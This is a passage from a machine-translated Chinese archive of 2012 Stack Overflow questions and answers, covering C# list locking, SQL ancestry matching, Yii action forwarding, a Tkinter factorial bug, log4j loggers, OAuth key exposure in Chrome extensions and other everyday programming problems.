           for(var i=0;i<list.Length;i++) DoSomething(list[i]);
      }
} 
```

**Execute1**方法是以线程安全的方式枚举列表的“正常”方式。但是**Execute2**呢？这种方法仍然是线程安全的吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-10T07:27:54.493

在这两种情况下，对 List （副本）的访问都是线程安全的。但当然 MyItem 元素不会以任何方式同步。

第二种形式看起来有点贵，但它允许在`DoSomething()`s 运行时在原始形式上添加/删除。该数组就像一种快照，如果符合您的要求，它可能会很有用。请注意，您不妨使用`ToList()`.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-10T07:16:23.017

只要其他所有使用`_list`也受到相同`lock`声明的保护，它就是安全的。您正在对列表进行独占访问，复制其内容，然后处理副本（由于范围界定，您也拥有独占访问权限）。乍一看有点浪费，但在某些情况下是一种合法的方法。

# android - 在 Android 中使用 GoogleAnalyticsTracker 跟踪应用程序版本

> ID：10084574
> 
> 赞同：-3
> 
> 时间：2012-04-10T07:12:58.817
> 
> 标签：android

我需要跟踪应用程序版本。我正在使用 GoogleAnalyticsTracker。试过：

```
tracker.setProductVersion(ver, subver); 
```

但谷歌分析中没有版本信息作为选项出现。此信息是否可用或者我必须使用自定义值？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-10T09:14:01.340

Google Analytics for Mobile Apps SDK 提供了一个界面，用于跟踪移动应用程序内的活动并将该活动报告给 Google Analytics。例如，您可以使用此 SDK 计算访问次数、会话长度、跳出率和唯一身份访问者。跟踪移动应用程序与跟踪网站页面有一些结构上的差异。

[http://code.google.com/apis/analytics/docs/mobile/android.html](http://code.google.com/apis/analytics/docs/mobile/android.html)

# android - 获取文本的 Mimetype 和编码字符集？

> ID：10084575
> 
> 赞同：0
> 
> 时间：2012-04-10T07:12:59.753
> 
> 标签：android, character-encoding, webview, mime-types

大家好，我正在从我的数据库中获取文本，在将文本插入数据库之前，我知道文本的编码是 ISO-8859-1，但是在从数据库中获取之后并在加载此文本之前，我正在通过此代码检查编码

```
InputStreamReader is = new InputStreamReader(new ByteArrayInputStream(body.getBytes()));
is.getEncoding();   
Log.v("encoding", ""+is.getEncoding());

// String body =  fetched from db 
```

我正在日志中输入文本的编码是 UTF-8。并且此文本未使用此方法加载到 webview 上：

```
mailView.loadDataWithBaseURL(null, body, "text/html", "UTF-8", null); 
```

请建议我解决此问题的正确方法。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2015-02-13T03:19:30.930

这个回复太晚了，但我通过谷歌偶然发现了这个问题，所以我想我会回答的。

如 JavaDoc 中所述，`new InputStreamReader(InputStream)`将使用系统默认值（显然是 UTF-8）创建一个阅读器。`is.getEncoding()`只是返回可能与您存储的数据匹配或不匹配的默认值。

通常，明确指定流的编码是个好主意。这意味着您需要将编码与内容一起存储。您可以使用带外知识（例如，我的应用程序仅使用 ISO-8859-1），但是如果您将来更改您选择的编码，这将是脆弱的。

由于这个世界并不总是一个美好的地方，并且字符串与它们的字符集分开，你可能会研究一个字符集检测器。[以 http://userguide.icu-project.org/conversion/detection](http://userguide.icu-project.org/conversion/detection)为例。

# sql - sql in 子句不起作用

> ID：10084576
> 
> 赞同：0
> 
> 时间：2012-04-10T07:13:03.970
> 
> 标签：sql, in-clause

我有一个表格，其中有一列祖先，其中包含一个祖先列表，格式如下“1/12/45”。1 是根，12 是 1 的孩子，等等......

我需要在其祖先列表中找到具有特定节点/编号的所有记录。为此，我编写了以下 sql 语句：

```
select * from nodes where 1 in (nodes.ancestry) 
```

我收到以下错误声明：运算符不存在：整数 = 文本

我也试过这个：

```
select * from nodes where '1' in (nodes.ancestry) 
```

但它只返回在其祖先字段中具有 1 的记录。不是例如 1/12/45 的那个

怎么了？

谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-10T07:17:18.837

这听起来像是一份工作`LIKE`，而不是`IN`。

如果我们假设您想在任何位置搜索此值，那么我们可能会尝试：

```
 select * from nodes where '/' + nodes.ancestry + '/' like '%/1/%' 
```

请注意，字符串连接的确切语法因 SQL 产品而异。请注意，我在`ancestry`列前添加和附加，这样我们就不必将列表中的第一个/最后一个项目与中间项目区别对待。另请注意，我们将 with 包围`1`起来`/`，这样我们就不会得到错误的匹配，例如 with`/51/`或`/12/`。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-10T07:21:46.853

`in`运算符需要逗号分隔的值列表或查询结果，即：

```
... in (1,2,3,4,5) 
```

或者：

```
... in (select id from SomeOtherTable) 
```

您需要做的是从数字创建一个字符串，以便您可以在另一个字符串中查找它。

只是`'1'`在祖先列表中查找字符串会给出误报，因为它会在字符串中找到它`'2/12/45'`。您需要将分隔符添加到两个字符串的开头和结尾，以便您在类似的字符串中查找类似`'/1/'`的字符串`'/1/12/45/'`：

```
select * from nodes
where charindex('/' + convert(varchar(50), 1) + '/', '/' + nodes.ancestry + '/') <> 0 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-10T07:17:03.237

在 MySQL 中，您可以编写：

```
SELECT * FROM nodes
WHERE ancestry = '1' 
   OR LEFT(ancestry, 2) = '1/'
   OR RIGHT(ancestry, 2) = '/1'
   OR INSTR(ancestry, '/1/') > 0 
```

# asp.net-mvc-3 - 具有动态价值的 MVC3 购物车

> ID：10084578
> 
> 赞同：0
> 
> 时间：2012-04-10T07:13:13.127
> 
> 标签：asp.net-mvc-3, shopping-cart

我正在关注本教程；[http://www.asp.net/mvc/tutorials/mvc-music-store/mvc-music-store-part-8](http://www.asp.net/mvc/tutorials/mvc-music-store/mvc-music-store-part-8)

在我的项目中，我想通过单选按钮值而不是“价格”的租金价格。

如何使用 ajax 传递购物车的单选按钮值？

这是我的源详细信息..你能告诉我如何使用 ajax 传递单选按钮值吗？

我真的是过去两周的库存。我需要你的帮助。

谢谢。

[MVC3为购物车传递radioButton值](https://stackoverflow.com/questions/10071741/mvc3-passing-the-radiobutton-value-for-shopping-cart)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-10T07:34:27.500

我不确定你是否能够通过在不了解 MVC 音乐商店的情况下破解它来创建一个像样的 MVC 应用程序。

如果您返回并实际执行/重做本教程，那么我相信您将能够回答您自己的问题。

[您提供](http://www.asp.net/mvc/tutorials/mvc-music-store/mvc-music-store-part-8)的链接显示

1）如何形成帖子到 AddToCart

2) 如何在 RemoveFromCart 中通过 Ajax 发布

因此，您需要做的就是更改 AddToCart 控制器和视图以使用 Ajax Post（如 RemoveFromCart），并将选定的单选按钮价格值包含在发送到控制器的帖子中。

这一切都在教程中。

祝你好运！

# ruby-on-rails-3 - Twitter 与 rails 3 应用程序的集成

> ID：10084581
> 
> 赞同：0
> 
> 时间：2012-04-10T07:13:23.450
> 
> 标签：ruby-on-rails-3, ruby-on-rails-3.1

我想使用 twiter 应用程序登录，因为我使用 gem 'omniauth-twitter' 现在请告诉我当我想使用 localhost:3000 时，Twitter 中的应用程序 url 是什么，我给了[http://0.0.0.0:3000](http://0.0.0.0:3000)作为 url

并在回调网址中我的索引页面如

localhost:3000/index 我的应用程序无法通过单击此链接重定向到 twiiter 页面 [http://localhost:3000/auth/twitter](http://localhost:3000/auth/twitter)

请一些身体帮助我......

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-10T13:47:58.483

我还使用 twitter-omniauth 来为人们注册 twitter...这些是我在 routes.rb 中使用的与 twitter-omniaouth 相关的路线：

```
match '/auth/twitter/callback' => 'sessions#create'

match '/signin' => 'sessions#new', :as => :signin

match '/signout' => 'sessions#destroy', :as => :signout

match '/auth/failure' => 'sessions#failure' 
```

希望能帮助到你？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-10T07:27:15.117

对于回调 URL，使用[http://127.0.0.1:3000](http://127.0.0.1:3000)作为基础，并指定处理omniauth 信息的控制器的路由。

示例： http: [//127.0.0.1 :3000/auth/twitter/callback](http://127.0.0.1:3000/auth/twitter/callback)

# java - xml签名中的签名方法

> ID：10084582
> 
> 赞同：0
> 
> 时间：2012-04-10T07:13:33.013
> 
> 标签：java, encryption, xml-signature

在 xml 签名中的签名方法中，您已经指定了这种格式：`SignatureMethod.RSA_SHA1`但是当使用普通签名时，您只需执行

```
Cipher c1=Cipher.getInstance("RSA"); 
```

那么这两者有什么区别呢？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-10T07:27:23.543

区别很简单：

`RSA`是一种（[公钥](http://en.wikipedia.org/wiki/Public-key_cryptography)）[加密](http://en.wikipedia.org/wiki/Cryptography)算法，其中*公钥*用于加密重要消息。加密数据必须用私钥解密。

`RSA-SHA1`另一方面，是[`RSA`密码学](http://en.wikipedia.org/wiki/RSA)+[`SHA1`消息摘要](http://en.wikipedia.org/wiki/SHA-1)的组合。[消息摘要](http://en.wikipedia.org/wiki/Message_digest)是一种单向散列函数，具有四个主要或重要的属性：

*   很容易计算任何给定消息的哈希值
*   生成具有给定哈希的消息是不可行的
*   在不更改哈希的情况下修改消息是不可行的
*   找到具有相同哈希的两条不同消息是不可行的

在[数字签名](http://en.wikipedia.org/wiki/Digital_signature)中，需要**保证**签名从发送者到接收者都是有效的。通过密码算法（例如）创建签名，然后通过散列函数（例如）对`RSA`公钥、消息和签名进行验证过程以确保*真实性*。`SHA-1`

# iphone - 如何在触摸时旋转 CALayer？

> ID：10084585
> 
> 赞同：2
> 
> 时间：2012-04-10T07:13:43.780
> 
> 标签：iphone, calayer, uitouch

我正在制作一个模拟时钟。它有一只可用于设置闹钟时间的指针。我为此目的使用 CALayer。它的内容是时钟指针图像。

**1）我如何在顺时针和逆时针方向没有动画的情况下旋转或拖动这只手？**

**编辑：**我能够使用以下代码顺时针方向拖动手

```
 - (void) touchesMoved:(NSSet*)touches withEvent:(UIEvent*)event
    {       
        touch=[[event allTouches] anyObject];
        CGPoint p=[touch locationInView:touch.view];
        if (CGRectContainsPoint(clockView1.draghand.frame, p)) 
        {
            [CATransaction begin];
            CGFloat dragangle = Deg2Radians(1);
            [CATransaction setAnimationDuration:0];
            clockView1.draghand.transform = CATransform3DRotate(clockView1.draghand.transform,dragangle, 0, 0, 1);
            [CATransaction commit]; 
        }
} 
```

**现在，如何逆时针旋转它？如何检测用户是顺时针方向还是逆时针方向拖动手？**

# iphone - DidFinishLaunching 中的 UILocalNotification 对象总是为零？

> ID：10084587
> 
> 赞同：0
> 
> 时间：2012-04-10T07:14:03.827
> 
> 标签：iphone, ios, uilocalnotification

我正在为指定日期创建**本地通知**，如下所示

```
UILocalNotification *localNotify = [[UILocalNotification alloc]init];
        [localNotify setFireDate:notificationDate];
        [localNotify setTimeZone:[NSTimeZone localTimeZone]];
        [localNotify setAlertBody:@"Daily Items Reminder"];
        //[localNotify setAlertLaunchImage:@"blank_Btn"];
        [localNotify setAlertAction:@"View"];
        [localNotify setSoundName:UILocalNotificationDefaultSoundName];
        [localNotify setApplicationIconBadgeNumber:1];
        [localNotify setRepeatInterval:NSDayCalendarUnit];
        NSDictionary *userDict = [NSDictionary dictionaryWithObject:@"dict"
                                                             forKey:@"key"];
        localNotify.userInfo = userDict;
        [[UIApplication sharedApplication] scheduleLocalNotification:localNotify];
        [localNotify release]; 
```

在我的**ApplicationDidFinishLaunching中，我为****UILocalNotification**创建了一个对象，如下所示

```
- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions
{

self.window = [[[UIWindow alloc] initWithFrame:[[UIScreen mainScreen] bounds]] autorelease];
[[UIApplication sharedApplication] setStatusBarStyle:UIStatusBarStyleBlackTranslucent];

UILocalNotification *notification = [launchOptions objectForKey:UIApplicationLaunchOptionsLocalNotificationKey];

if (notification)
{
    NSInteger badgeNumber =  notification.applicationIconBadgeNumber;

    if (badgeNumber < 0)
    {
        notification.applicationIconBadgeNumber = 0;
    }
    else
    {
        notification.applicationIconBadgeNumber = badgeNumber - 1;
    }

    [self showAlertMessage:@"didFinishLaunchingWithOptions" withButtons:eOk forDelegate:self];
    // open screen
}
} 
```

**在出现本地通知**时单击查看按钮后，应用程序启动，现在**launchOption**应该通过键返回本地通知**对象**，但它总是返回 nil，因为没有调用警报视图？？..我可能做错了什么？

# php - Yii - 从另一个动作方法调用一个动作方法

> ID：10084594
> 
> 赞同：3
> 
> 时间：2012-04-10T07:14:39.303
> 
> 标签：php, yii

标题可能令人困惑，但这里有代码解释。

根据某些情况，`actionContact`即使用户调用了，我也可能会调用`actionIndex`。

**解决方案：1**

```
 public function actionIndex()
    { 
        $a = 5;
        if($a == 5){

$this->actionContact();
        }
        else{
            $this->render('index');
        }
    }

    public function actionContact()
    {
        // Some codes
        $this->render('contact');
    } 
```

**解决方案：2**

```
public function actionIndex()
        { 
            $a = 5;
            if($a == 5){

// Repeat code from actionContact method
            $this->render('contact');
        }
        else{
            $this->render('index');
        }
    } 
```

**解决方案：3**我可以重定向到联系网址。

我认为，解决方案 1 对我来说很好，我更喜欢这样。但是由于我是 yii 的新手，我想知道，如果它是要走的路？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-04-10T07:53:35.280

如果没有问题，您可以使用**forward**

[http://www.yiiframework.com/doc/api/1.1/CController#forward-detail](http://www.yiiframework.com/doc/api/1.1/CController#forward-detail)

```
public function actionIndex()
{ 
    $a = 5;
    if($a == 5){
        // Forward user to action "contact"
        $this->forward('contact'); 
    }
    else{
        $this->render('index');
    }
}

public function actionContact()
{
    // Some codes
    $this->render('contact');
} 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-04-10T07:20:26.493

“重复代码”很少是正确的答案。重定向涉及额外的开销，在我看来，它们应该主要用于响应 POST 操作，而不是像这样。在这种情况下，我会选择解决方案 1。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-04-10T07:21:47.633

您可以使用第四个选项，即将索引和联系操作常用的部分重构为第三种方法：

```
public function common() {
    // ...
}

public function actionIndex() {
    // ... call $this->common()
}

public function actionContact() {
    // ... call $this->common()
} 
```

不过，最佳选择取决于您的具体情况。例如，当您决定必须调用不同的操作时，您是否也想渲染它的视图？

# python - Python阶乘计算器错误？

> ID：10084595
> 
> 赞同：0
> 
> 时间：2012-04-10T07:14:39.603
> 
> 标签：python, tkinter, calculator, factorial

因此，我开始在 Python 中学习 Tkinter（就此而言，刚刚开始学习 Python）并决定尝试使用 Tkinter 创建一个阶乘计算器。我不会做任何太花哨的事情，这就是我想出的：

```
from Tkinter import *
import tkMessageBox

def calculate():
    number = inputNumber.get()
    inputNumber.delete(0, END)
    product = 1
    for i in range(number):
        product = product * (i+1)
    inputNumber.insert(product)

cal = Tk()
cal.title("Factorial Calculator")
cal.geometry('450x300+200+200')

factorialNumber = IntVar()
inputNumber = Entry(cal, textvariable=factorialNumber)
inputNumber.pack()

enterButton= Button(cal, text="CALCULATE!", width=20,command=calculate)
enterButton.pack(side='bottom',padx=15,pady=15)

cal.mainloop() 
```

所以我跑了这个，当我点击“计算！” 按钮，它吐出这个错误：

```
Traceback (most recent call last):
File "C:\Python27\Lib\lib-tk\Tkinter.py", line 1410, in __call__
return self.func(*args)
File "C:\Users\Wesley Yu\Desktop\New folder (4)\module1.py", line 8, in calculate
for i in range(number):
TypeError: range() integer end argument expected, got str. 
```

我已经尝试修复它，但无济于事。我应该怎么办？

对不起，如果这是非常基本的，还在学习:)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-10T07:17:34.717

条目产生字符串。首先将其传递给`int()`构造函数。

```
>>> int('42')
42 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-10T07:18:08.320

尝试这个：

```
for i in range(int(number)):
    etc 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-11T17:41:35.910

python 有一个内置函数，用于使用数学模块计算阶乘：

```
import math

i = 40      #an example number

print math.factorial(i) 
```

看起来您正在运行 python 3.x，因此如果不对其进行任何修改，您将无法使用上面的确切代码。我希望这有帮助。

# google-chrome-extension - 在 JS 中实现 OAuth 并暴露 Consumer Secret 和 Key 好不好？

> ID：10084598
> 
> 赞同：3
> 
> 时间：2012-04-10T07:15:04.813
> 
> 标签：google-chrome-extension, twitter-oauth

我想为 Chrome 开发一个 Twitter 客户端。我已经看到了 Chrome 现有 Twitter 扩展的 JS 文件。并发现他们的消费者密钥和秘密被暴露了。我相信这不是应该的方式。

我想分享我对服务器端的**看法。**该用户需要在我的网站上注册。在该网站上有 oAuth。我将保存他们的访问令牌。当他们安装我的 Chrome 扩展程序时。我会要求他们登录。每次他们发推文时，我都会在线获取他们的访问令牌并使他们的推文成为可能。

这样，我的钥匙将保持隐藏状态。我不想使用[Chrome OAuth](http://code.google.com/chrome/extensions/tut_oauth.html)。

你认为我的 OAuth 服务器端实现比 JS 实现更好吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-10T12:05:45.240

我认为不共享这些数据通常是一个更好的主意，但是在 Chrome 扩展程序中更难做到，因为它更多的是前端开发（除非你想为扩展程序维护自己的服务器......）。我认为暴露您的 OAuth 凭据不会有太大的风险。如果他们被恶意用来攻击 Twitter，Twitter 将阻止访问，您只需申请新密钥即可。您的用户密钥将安全地存储在他们自己的机器上，这样用户数据就可以了。如果您正在寻找一种在扩展中实现 OAuth2 协议的简单方法，这是我为此创建的实用程序。

[https://github.com/jjNford/oauth2-chrome-extension](https://github.com/jjNford/oauth2-chrome-extension)

[我在这个扩展](https://chrome.google.com/webstore/detail/jgekomkdphbcbfpnfjgcmjnnhfikinmn?utm_source=chrome-ntp-icon)中使用我自己的这个实现。

# csv - Struts 2 CSV文件上传

> ID：10084600
> 
> 赞同：0
> 
> 时间：2012-04-10T07:15:18.147
> 
> 标签：csv, struts2

有人可以告诉我如何在 struts 2 应用程序中上传 csv 文件吗？

问候， Shreyash

# iphone - 如何突出显示 UIButton 子类？

> ID：10084606
> 
> 赞同：0
> 
> 时间：2012-04-10T07:15:39.770
> 
> 标签：iphone, objective-c, cocoa-touch

我有一个为自定义外观按钮`UIButton`覆盖的子类。`drawRect`

但是现在单元格没有突出显示。

我怎样才能解决这个问题？

当按下单元格时，我已经为另一个自定义 drawRect 准备好了代码。

```
- (void)drawRect:(CGRect)rect
{
    //// General Declarations
    CGColorSpaceRef colorSpace = CGColorSpaceCreateDeviceRGB();
    CGContextRef context = UIGraphicsGetCurrentContext();

    //// Color Declarations
    UIColor* red = [UIColor colorWithRed: 1 green: 0 blue: 0 alpha: 1];
    CGFloat redRGBA[4];
    [red getRed: &redRGBA[0] green: &redRGBA[1] blue: &redRGBA[2] alpha: &redRGBA[3]];

    UIColor* darkRed = [UIColor colorWithRed: (redRGBA[0] * 0.8) green: (redRGBA[1] * 0.8) blue: (redRGBA[2] * 0.8) alpha: (redRGBA[3] * 0.8 + 0.2)];
    UIColor* lightRed = [UIColor colorWithRed: (redRGBA[0] * 0.8 + 0.2) green: (redRGBA[1] * 0.8 + 0.2) blue: (redRGBA[2] * 0.8 + 0.2) alpha: (redRGBA[3] * 0.8 + 0.2)];

    //// Gradient Declarations
    NSArray* redGradientColors = [NSArray arrayWithObjects: 
                                  (id)darkRed.CGColor, 
                                  (id)lightRed.CGColor, nil];
    CGFloat redGradientLocations[] = {0, 1};
    CGGradientRef redGradient = CGGradientCreateWithColors(colorSpace, (__bridge CFArrayRef)redGradientColors, redGradientLocations);

    //// Shadow Declarations
    CGColorRef shadow = [UIColor lightGrayColor].CGColor;
    CGSize shadowOffset = CGSizeMake(0, -0);
    CGFloat shadowBlurRadius = 1;
    CGColorRef shadow2 = [UIColor blackColor].CGColor;
    CGSize shadow2Offset = CGSizeMake(0, -0);
    CGFloat shadow2BlurRadius = 2;

    //// Rounded Rectangle Drawing
    UIBezierPath* roundedRectanglePath = [UIBezierPath bezierPathWithRoundedRect: CGRectMake(35, 5, 250, 50) cornerRadius: 6];
    CGContextSaveGState(context);
    CGContextSetShadowWithColor(context, shadow2Offset, shadow2BlurRadius, shadow2);
    CGContextSetFillColorWithColor(context, shadow2);
    [roundedRectanglePath fill];
    [roundedRectanglePath addClip];
    CGContextDrawLinearGradient(context, redGradient, CGPointMake(160, 55), CGPointMake(160, 5), 0);

    ////// Rounded Rectangle Inner Shadow
    CGRect roundedRectangleBorderRect = CGRectInset([roundedRectanglePath bounds], -shadowBlurRadius, -shadowBlurRadius);
    roundedRectangleBorderRect = CGRectOffset(roundedRectangleBorderRect, -shadowOffset.width, -shadowOffset.height);
    roundedRectangleBorderRect = CGRectInset(CGRectUnion(roundedRectangleBorderRect, [roundedRectanglePath bounds]), -1, -1);

    UIBezierPath* roundedRectangleNegativePath = [UIBezierPath bezierPathWithRect: roundedRectangleBorderRect];
    [roundedRectangleNegativePath appendPath: roundedRectanglePath];
    roundedRectangleNegativePath.usesEvenOddFillRule = YES;

    CGContextSaveGState(context);
    {
        CGFloat xOffset = shadowOffset.width + round(roundedRectangleBorderRect.size.width);
        CGFloat yOffset = shadowOffset.height;
        CGContextSetShadowWithColor(context,
                                    CGSizeMake(xOffset + copysign(0.1, xOffset), yOffset + copysign(0.1, yOffset)),
                                    shadowBlurRadius,
                                    shadow);

        [roundedRectanglePath addClip];
        CGAffineTransform transform = CGAffineTransformMakeTranslation(-round(roundedRectangleBorderRect.size.width), 0);
        [roundedRectangleNegativePath applyTransform: transform];
        [[UIColor grayColor] setFill];
        [roundedRectangleNegativePath fill];
    }
    CGContextRestoreGState(context);

    CGContextRestoreGState(context);

    [[UIColor blackColor] setStroke];
    roundedRectanglePath.lineWidth = 1;
    [roundedRectanglePath stroke];

    //// Cleanup
    CGGradientRelease(redGradient);
    CGColorSpaceRelease(colorSpace);
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-20T10:19:54.747

我认为您可以使用以下这些方法处理突出显示问题

```
- (BOOL)beginTrackingWithTouch:(UITouch *)touch withEvent:(UIEvent *)event;
- (BOOL)continueTrackingWithTouch:(UITouch *)touch withEvent:(UIEvent *)event;
- (void)endTrackingWithTouch:(UITouch *)touch withEvent:(UIEvent *)event;
- (void)cancelTrackingWithEvent:(UIEvent *)event; 
```

您可以在这些方法中更改颜色或图像

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-10T07:22:37.927

子类化 UIButton 没有意义，因为它是一种程序集/集群类。

在继承 UIControl 并添加一些自定义行为时，我拥有创建自己的按钮的最佳体验。

还要检查[这个](https://stackoverflow.com/questions/5045672/create-uibutton-subclass)（你不应该继承 UIButton）。

然后还要[检查如何突出显示 UIControl subclass](https://stackoverflow.com/questions/4428437/highlighting-a-uicontrol-subclass)。

# objective-c - 管理调用委托回调块的对象的内存

> ID：10084607
> 
> 赞同：1
> 
> 时间：2012-04-10T07:15:41.443
> 
> 标签：objective-c, cocoa, objective-c-blocks, grand-central-dispatch

假设我有一个 ObjectA 类（例如视图控制器），它执行以下操作：

```
ObjectB *objectB = [[ObjectB alloc] init];

[objectB executeLongRequestThenDo:^ (NSDictionary *results)
 {
     self.datasource = results;
     [self.tableView reloadData];
 }]; 
```

ObjectA 可以随时释放，所以我应该能够取消 objectB 的请求，并告诉它在完成后不要执行块，对吧？仅仅释放它还不够吗？另外，我应该`release`在之后打电话`executeLongRequestThenDo:`吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-10T07:29:53.400

不，`ObjectA`任何时候都不会被释放——它将一直保留到`ObjectB`操作完成。

可能`-[ObjectB executeLongRequestThenDo:]`会调用`Block_copy`块。这将导致该块从堆栈移动到堆中，并将保留`NSObject`该块直接引用的所有 s，即`self`.

完成`ObjectB`后，它应该运行该块，然后调用`Block_release`，这将释放`self`。或者，如果你有某种方式取消操作，`ObjectB`应该同样释放块。

（ObjectB 可能会间接地完成这一切，通过调用一些可以完成工作的东西，比如`dispatch_async`.）

参考：[块编程主题。](https://developer.apple.com/library/ios/#documentation/Cocoa/Conceptual/Blocks/Articles/00_Introduction.html#//apple_ref/doc/uid/TP40007502-CH1-SW1)

至于何时应该释放`objectB`：这取决于它是否在长时间运行的操作过程中保留自身。为了安全起见，在你知道它完全完成之前，我不会释放它，这将是在你的块的末尾，或者在你调用它的取消方法之后。

# java - 我们可以创建两个 log4j 实例吗

> ID：10084612
> 
> 赞同：3
> 
> 时间：2012-04-10T07:16:10.053
> 
> 标签：java, jboss, log4j

我们能否在一个类中创建两个 log4j 实例以写入文件，另一个在 jdbcadapter 中？

```
// one to write log in console
Logger log = Logger.getLogger(this.getClass()); 

// write in database within one class 
Logger log1 = Logger.getLogger(this.getClass()); 
```

我的 jdbc 适配器是我的文件适配器是我想为文件记录器实例日志和用于 jdbc 的记录器即时日志 1。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-10T07:24:49.847

其中`log4j`有各种`Appenders`可用的，带有描述性名称的，例如`FileAppender, ConsoleAppender, SocketAppender, SyslogAppender, NTEventLogAppender and even SMTPAppender`. 多个 Appender 可以附加到任何 Logger，因此可以将相同的信息记录到多个输出；例如本地文件和另一台计算机上的套接字侦听器。

此外，如果想根据级别将日志写入不同的输出，那么您可以尝试[Log to appender by level](http://wiki.apache.org/logging-log4j/LogToAppenderByLevel)。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-10T07:21:50.453

这仅适用于您为第二个记录器指定不同名称的情况。否则两个变量将包含相同的实例。例如：

```
Logger log = Logger.getLogger(this.getClass());
Logger log1 = Logger.getLogger(this.getClass().getName() + ".db"); 
```

然后你有两个分开的记录器。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-10T07:24:22.063

我不确定这是否会创建实例（或返回相同的缓存实例），但即使这样做，它也将具有相同的 appender 配置（因为该类别使用相同的类名）。

您可以获得两个具有不同类别名称的不同记录器：

```
Logger log = Logger.getLogger(this.getClass()); 

Logger log1 = Logger.getLogger(this.getClass().getName()+".extra"); 
```

他们登录的位置在 log4j.properties 中配置。

此外，您可以将相同的 logger 日志记录到多个 appender，具体取决于优先级等过滤器。因此，除非您的代码中有复杂的逻辑来记录在哪里记录什么，否则您可以只使用一个记录器，它仍然可以同时进入文件和数据库。

# javascript - Microsoft JScript 运行时错误：“Alticore”未定义

> ID：10084614
> 
> 赞同：0
> 
> 时间：2012-04-10T07:16:20.410
> 
> 标签：javascript, asp.net

在我的项目中，我使用 Ajax 弹出控件来显示地址详细信息。弹出窗口显示完美第一次页面加载，但是当我保存我的详细信息并单击弹出按钮时，它会出现错误，如“Microsoft JScript 运行时错误：'Alticore' 未定义”。以下是我的代码，请帮助我。

```
function EditAddress(addressId)
{
    var companyId = $get('hdnCompanyId').value;
    var url = "AddAddressDetails.aspx?AddressId=" + addressId + "&EntityId=" + companyId   + "&EntityType=COMPANY";
    Alticore.Framework.openModalFrame('divEditAddress', url, { 'callback': addressPopupClosed, 'draggable': true, 'title': "Address Details ", 'width': '600px', 'height': '380px' });
}

function addressPopupClosed(response) // This method is called when the Popup is closed
{
    try {
        if (response.IsOk) {
            $get('btnListAddress').click();
            activeTabId = "AddressDetails";
        }
    }
    catch (e) {
        alert(e.message);
    }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-10T07:22:58.407

您是否链接了您的 css 文件和/或定义 Alticore 的 js 文件？就像是：

```
<LINK href="Style.css" type="text/css" rel="StyleSheet">
<script src="Library.js" type="text/javascript"></script> 
```

# android - Android静态函数调用抛出NullPointerException

> ID：10084622
> 
> 赞同：-2
> 
> 时间：2012-04-10T07:16:30.317
> 
> 标签：android

我有一个 appwidget，它创建一个对象（传递它的上下文），然后在其他一些类上调用一个静态方法。

对静态方法的调用会引发 NullPointerException，我不知道为什么。

这是代码：

```
public String[] g(int count, Boolean h) {       

    String[] result = MyFactory.g(mContext, mDb, count, h);

    if (result != null) {
        m = result.length;
    }
    else {
        m = 0;
    }

    return result;

} 
```

在 MyFactory.g 引发异常。g 是一个静态函数。

什么可以在这里为空？

这似乎发生在我的一些用户身上，但不是在我的设备上……令人沮丧。

谢谢。

顺便说一句：我在我的应用程序上使用了 proguard，是否有可能因为 proguard 我没有得到整个堆栈跟踪（在静态函数内部）？

MyFactory 类：

```
public class MyFactory {

public static String[] g(Context mContext, SQLiteDatabase db, int count, boolean hasShortcut) {

    SharedPreferences prefs = 
        mContext.getSharedPreferences(A.SHARED_PREFS_NAME, 0);

    int type = Integer.parseInt(prefs.getString(mContext.getString(R.string.pref_type_key), "0"));

    switch (type) {
        case 1:
            return T1.g(db, count, hasShortcut);

    }

    return D1.g(db, count, hasShortcut);        

}

} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-20T07:27:13.303

我不知道问题出在哪里，但我只是将静态函数代码复制到非静态调用函数中，它就起作用了。

# javascript - 使用 DOM 3 级侦听器禁用退格

> ID：10084628
> 
> 赞同：0
> 
> 时间：2012-04-10T07:16:50.273
> 
> 标签：javascript, dom-events, event-listener, dom3

我正在制作一个用户必须能够输入的页面。退格的默认功能是返回一个页面，但是我需要防止这种情况并为其分配我自己的功能。

问题实际上是防止退格。我可以捕捉它，但我无法阻止它。我正在使用 3 级事件侦听器。`event.preventDefault()`对我不起作用，也没有返回错误。

我也试过这个：

```
function onunload(e) {
    if (e.keyCode == 37) return false;
    return true;
} 
```

和

```
<body onunload="return false;"> 
```

但是第一个基本上可以

```
return confirm("false"); 
```

第二个什么都不做？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-10T08:04:29.733

AFAIR，可以通过`keypress`仅在 Firefox 中返回 false 来阻止默认的浏览器快捷操作（我测试的最后一个版本是 3.x）。

`beforeunload`并且`unload`是特定的事件和字符串应该在它们的处理程序中返回。出于安全原因，浏览器可能仅显示带有提供消息（该字符串）的确认对话框。此外，自 4 版以来的 Firefox 甚至会忽略该字符串并始终显示标准消息。

没有办法静默阻止用户离开页面。

顺便说一句，退格键在 Ubuntu 中不能用作 history.back() 。

* * *
